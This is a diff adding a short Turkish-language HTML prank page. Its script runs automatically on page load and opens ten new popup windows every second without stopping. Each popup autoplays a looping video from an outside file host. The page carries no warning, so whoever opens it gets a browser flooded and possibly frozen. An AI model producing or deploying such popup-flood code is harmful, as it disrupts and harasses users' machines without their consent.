@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Şaka Başlasın!</title>
+    <script>
+        function openPopups() {
+            let videoURL = 'https://files.catbox.moe/781ihg.mp4'; // MP4 dosyanın yeni URL'si
+            let interval = setInterval(() => {
+                for (let i = 0; i < 10; i++) {
+                    let popup = window.open('', '', 'width=400,height=300');
+                    if (popup) {
+                        popup.document.write(`
+                            <html>
+                            <head>
+                                <title>İzle Bakalım!</title>
+                            </head>
+                            <body>
+                                <video width="100%" height="100%" autoplay loop muted>
+                                    <source src="${videoURL}" type="video/mp4">
+                                    Tarayıcın bu videoyu desteklemiyor.
+                                </video>
+                            </body>
+                            </html>
+                        `);
+                    }
+                }
+            }, 1000);
+        }
+        
+        window.onload = openPopups;
+    </script>
+</head>
+<body>
+    <h1>Şaka başlıyor!</h1>
+</body>
+</html>
+
